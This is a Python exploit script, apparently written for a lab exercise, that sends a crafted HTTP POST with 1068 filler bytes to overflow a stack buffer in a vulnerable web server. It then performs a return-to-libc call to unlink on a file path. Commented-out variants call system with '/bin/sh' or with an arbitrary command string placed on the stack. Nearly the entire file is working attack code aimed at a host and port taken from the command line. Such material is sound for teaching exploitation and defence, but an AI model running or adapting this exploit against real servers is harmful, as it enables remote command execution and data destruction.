#!/usr/bin/python
import sys
import socket
import traceback
import struct
import time
import os.path
import binascii
from pwn import *

# libc base address
# ASLR shoud be off, so that libc's base address will not change untill next reboot 
# you can use "ldd ./program" to check the libc base address
base_addr = 0xf7d95000

# all of the offsets of functions (strings) inside libc won't change much (sometimes changed, so check is needed) .
# to get the offset of a funtion, you can use:
##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep " system"
# to get "/bin/sh":
## ropper --file /lib/i386-linux-gnu/libc.so.6 --string "/bin/sh"

# system
sys_addr = base_addr + 0x00044d00 
# /bin/sh
sh_addr = base_addr + 0x0018fb62
# exit
ex_addr = base_addr + 0x00037680 
# unlink
ul_addr = base_addr + 0x000f3f60
# dead
d_addr = 0xdeadbeef
# c0ffee00
c_addr = 0xc0ffee00

# ebp  too make the task simple, we print ebp of getToken function (vulnerable) 
ebp_addr = 0xffffd208



## Below is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the vulnerable web server and exploit it.

def build_exploit(shellcode):

    ul_arg = "/tmp/test.txt\0"
    ul_arg_addr = ebp_addr + 20

    sys_arg = "/bin/sh\0"
    sys_arg_addr = ebp_addr + 20

    req = ("POST / HTTP/1.1\r\n").encode('latin-1')
    # All of the header information other than "Content-Length" is not important
    req += ("Host: 127.0.0.1\r\n").encode('latin-1')
    # The Content-Length below is useful, and depends on the length of 
    # username plus password, you need to use wireshark (together with web browser) 
    # for checking the length
    req += ("Content-Length: 58\r\n").encode('latin-1') 
    req += ("Origin: http://127.0.0.1\r\n").encode('latin-1')
    req += ("Connection: keep-alive\r\n").encode('latin-1')
    req += ("Referer: http://127.0.0.1/\r\n").encode('latin-1')

    req += ("Hacking: ").encode('latin-1')
    # For different oses (and compilation), the length of fillup for 
    # hijacking the return address in the stack, could be different,
    # therefore you need to debug the program for checking and adjusting.
    req += b'A' * 1068 #  + b'C' * 4

    #req += p32(d_addr)

    # use "/bin/sh" string in libc
    #req += p32(sys_addr)
    #req += p32(ex_addr)
    #req += (sh_addr).to_bytes(4, byteorder='little')
    #req += p32(0)

    # put "/bin/sh" string in the stack
    # ebp is needed to locate the place of string 
    # Note: using this method, you can put arbitrary string in the stack, 
    # so that "system" can execute arbitrary command
    #req += p32(sys_addr)
    #req += p32(ex_addr)
    #req += p32(sys_arg_addr)
    #req += p32(0)
    #req += sys_arg.encode('latin-1')


    # remove a file specified by the path "ul_arg"
    req += p32(ul_addr)
    req += p32(ex_addr)
    req += p32(ul_arg_addr)
    req += p32(0)
    req += ul_arg.encode('latin-1')
    

    req += ("\r\n").encode('latin-1')
    req += ("\r\n").encode('latin-1')
   
    # Below is the username/password that you can Register into the web server
    # by using web browser. These information will be stored into the sqlite db behind.
    # You need to change these information according to your own registration.
 
    # Note that successful POST will be responded by the server with a hint page.
    # By using the successful response, you can judge whether the server has been 
    # crashed (by exploit), so that you can adjust the fillup accordingly.
    req += ("login_username=sa12&login_password=1234&submit_login=Login").encode('latin-1')

    print(req)
    return req

    #req += (addr1).to_bytes(4, byteorder='little')
    #req += ("@@@@").encode('latin-1')


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ("").encode("latin-1")
    while len(rbuf):
      resp=resp+rbuf
      rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp


if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellcode = ""
    if(os.path.exists("shellcode.bin")):
      shellfile = open("shellcode.bin", "r")
      shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
